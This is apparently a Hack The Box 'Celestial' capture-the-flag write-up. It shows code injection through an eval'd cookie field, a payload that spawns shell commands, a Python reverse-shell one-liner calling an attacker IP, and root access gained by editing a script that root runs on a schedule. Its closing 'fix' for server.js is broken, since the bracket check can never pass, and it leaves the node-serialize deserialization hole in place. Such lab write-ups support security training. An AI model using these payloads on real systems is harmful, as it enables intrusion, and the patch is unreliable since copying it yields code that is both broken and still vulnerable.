---
title: HTB Celestial Writeup
date: 2025-05-10
categories: [CTF, HTB]
tags: [CTF, HTB, Medium]
description: HTB Celestial Writeup
---
# Recon
## Nmap
```bash
nmap -Pn -v -p- -sV --min-rate 1000 celestial.htb -oN celestial_nmap.txt
```

```
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
```

# Initial Foothold and User.txt
Main page shows the text "404" on first visit. On subsequent visits the following text is shown.
![Screenshot](/assets/img/celestial-writeup-screenshot/image_1.png)

Examining the HTTP header shows a base64 encoded cookie value
![Screenshot](/assets/img/celestial-writeup-screenshot/image_2.png)

![Screenshot](/assets/img/celestial-writeup-screenshot/image_3.png)

2 of the JSON attributes seems to be reflected on the main page
- username
- num

The num parameter seems to be concatenated. This is tested by setting num to 3.
![Screenshot](/assets/img/celestial-writeup-screenshot/image_4.png)

The server seems to be using templates to reflect these 2 value. By trying the common payload for Server-side Template Injection "\{7\*7\}", the server evaluated the multiplication provided and printed 49.
![Screenshot](/assets/img/celestial-writeup-screenshot/image_5.png)

This proves that SSTI is possible. As an attempt to determine the exact backend framework and template engine used, an error was triggered which returned verbose error message.
![Screenshot](/assets/img/celestial-writeup-screenshot/image_6.png)
The error message
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token }<br> &nbsp; &nbsp;at /home/sun/server.js:13:29<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/sun/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)</pre>
</body>
</html>
```

From this we can see that:
- The server is running Express Node.js web framework
- There is a user "sun"
However, it still doesn't show what template engine is used.

A script was made to try perform fuzzing on the num parameter and see if any special characters will trigger the same syntax error. The following is the result:
```
-
.
""
{}
/
```

Also some global variables seems to return valid results (e.g. global).
![Screenshot](/assets/img/celestial-writeup-screenshot/image_7.png)

Through more googling, the following payload from HackTricks worked, which is intended for the template engine Jade.
```javascript
root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout
```
Source: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jade-nodejs

Output:
![Screenshot](/assets/img/celestial-writeup-screenshot/image_8.png)

It was found to be quite difficult to just run a one-line command for reverse shell execution (escaping quotes are painful). So from here the following steps were done to obtain a reverse shell:
1. Confirm that python3 is installed on the server (which python3)
2. Use revshells.com to create a python reverse shell
3. Issue a command to the server to download the reverse shell
4. Listen on port 443 (on attacker machine)
5. Execute the python reverse shell payload downloaded

Payload used:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.73",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

![Screenshot](/assets/img/celestial-writeup-screenshot/image_9.png)

user.txt at /home/sun/user.txt
# Root.txt
On the user's home directory, there was one file that stood out as it seems to be written by root.
![Screenshot](/assets/img/celestial-writeup-screenshot/image_10.png)

There is also another python script that seems to print out the exact words
![Screenshot](/assets/img/celestial-writeup-screenshot/image_11.png)

To do a simple test to check if the script.py was indeed running by root as a background process, the script.py was modified to print out something different
```
print "No it's not running..."
```

After 5 minutes, the output.txt file changed to the modified content
![Screenshot](/assets/img/celestial-writeup-screenshot/image_12.png)
After the first execution, the process is also shown when listing running processes. This shows that the script is indeed ran by root.
![Screenshot](/assets/img/celestial-writeup-screenshot/image_13.png)

By using the same python3 reverse shell payload used during initial access (changing connection port to 445), a reverse shell was obtained running as root.
![Screenshot](/assets/img/celestial-writeup-screenshot/image_14.png)

# Just for Fun
## Try to fix vulnerable server.js script
The following is the content of server.js which is the main script of the web server (in /home/sun/server.js).
```javascript
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) { 
     var sum = eval(obj.num + obj.num);
     res.send("Hey " + obj.username + " " + obj.num + " + " + obj.num + " is " + sum);
   }else{
     res.send("An error occurred...invalid username type"); 
   }
}else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("<h1>404</h1>");
});
app.listen(3000);
```

We can see that the vulnerability lies in  ```var sum = eval(obj.num + obj.num);```, where the user input ```obj.num``` is directly evaluated without any sanitation.

The most straightforward way to fix it is to check for the bracket characters ```{``` and ```}``` and prevent them from passing to ```eval()```

```javascript
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username && obj.num.indexOf("{") == 0 && obj.num.indexOf("}") == 0) { 
     var sum = eval(obj.num + obj.num);
     res.send("Hey " + obj.username + " " + obj.num + " + " + obj.num + " is " + sum);
   }else{
     res.send("An error occurred...invalid username type"); 
   }
}else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("<h1>404</h1>");
});
app.listen(3000);
```
